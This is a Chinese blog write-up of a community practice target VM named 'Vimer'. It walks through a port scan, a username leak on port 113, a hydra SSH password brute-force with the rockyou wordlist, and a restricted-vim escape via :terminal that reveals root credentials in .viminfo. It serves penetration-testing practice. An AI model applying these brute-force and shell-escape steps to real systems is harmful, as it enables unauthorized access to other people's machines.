---
title: "群友靶机之Vimer"
date: "2025-12-24 21:06:31"
tags: ["渗透测试"]
categories: ["群友靶机"]
url: "/posts/60187.html"
abbrlink: "60187"
---

获取靶机地址：https://maze-sec.com/

QQ群：`660930334`

# 配置：

```
靶机用VirtualBox制作，VMware导入可能网卡不兼容
用户:todd 密码:qq660930334
1. 启动虚拟机时按`e`键进入GRUB编辑模式
2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`
3. 按Ctrl+X启动进入单用户模式
vim /etc/network/interfaces
allow-hotplug ens33
iface ens33 inet dhcp

ip link set ens33 up
dhclient ens33
reboot -f
```

# 端口扫描

![image-20251219105429862](/images/image-20251219105429862.png)

```
22,80,113端口，113端口泄露了vim用户名，先尝试爆破ssh，再去看看80端口
```

# 80端口探测

![image-20251219105644347](/images/image-20251219105644347.png)

![image-20251219105653719](/images/image-20251219105653719.png)

```
是一个vim，没有什么特别的东西
```

# 爆破获得用户账号密码

```
hydra -l vim -P /usr/share/wordlists/rockyou.txt 192.168.44.151 ssh
vim/000001
```

# ssh连接

```
ssh vim@192.168.44.151
```

![image-20251219105823021](/images/image-20251219105823021.png)

```
在vim当中 :version可以看到版本信息和能使用的命令
```

![image-20251219105915701](/images/image-20251219105915701.png)

```
发现可以:terminal执行命令
:terminal ls -la
查看vim的配置信息
:terminal cat .viminfo
```

![image-20251219111620018](/images/image-20251219111620018.png)

![image-20251219111634299](/images/image-20251219111634299.png)

```
获得账号密码 root/xxxxoooo
```

![image-20251219111728324](/images/image-20251219111728324.png)

# 总结

```
113端口信息泄露用户名，爆破密码，vim配置可以执行命令有配置信息，泄露root账号密码
```
